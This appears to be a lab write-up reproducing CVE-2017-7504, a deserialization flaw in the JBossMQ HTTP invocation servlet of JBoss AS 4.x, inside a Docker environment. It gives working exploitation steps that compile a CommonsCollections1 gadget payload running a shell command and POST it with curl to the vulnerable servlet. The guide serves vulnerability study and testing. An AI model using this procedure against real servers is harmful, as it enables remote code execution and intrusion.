# JBoss 4.x JBossMQ JMS Deserialization Vulnerability (CVE-2017-7504)

Red Hat JBoss Application Server is a JavaEE-based open source application server. In JBoss AS 4.x and earlier, the JServer over HTTP Invocation Layer's HTTPServerILServlet.java file in the JBossMQ implementation process has a deserialization vulnerability that can be exploited by a remote attacker to create arbitrary code using specially crafted serialized data.

reference:

- https://github.com/joaomatosf/JavaDeserH2HC
- https://www.youtube.com/watch?v=jVMr4eeJ2Po

## vulnerability environment

Run the following command to start JBoss AS 4.0.5:

```
Docker-compose up -d
```

After the environment is started, the target is `http://your-ip:8080`.

## Vulnerability recurrence

Using the tool [JavaDeserH2HC] (https://github.com/joaomatosf/JavaDeserH2HC), we select a Gadget:`ExampleCommonsCollections1WithHashMap` to compile and generate serialized data:

```
Javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
Java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "touch /tmp/success"
```

Visible, the command we executed is `touch /tmp/success`. After the execution is completed, a file `ExampleCommonsCollections1WithHashMap.ser` will be generated, and the file will be sent as the body as follows:

```
Curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

![](1.png)

Execute `docker-compose exec jboss bash` to enter the container, visible `/tmp/success` has been successfully created.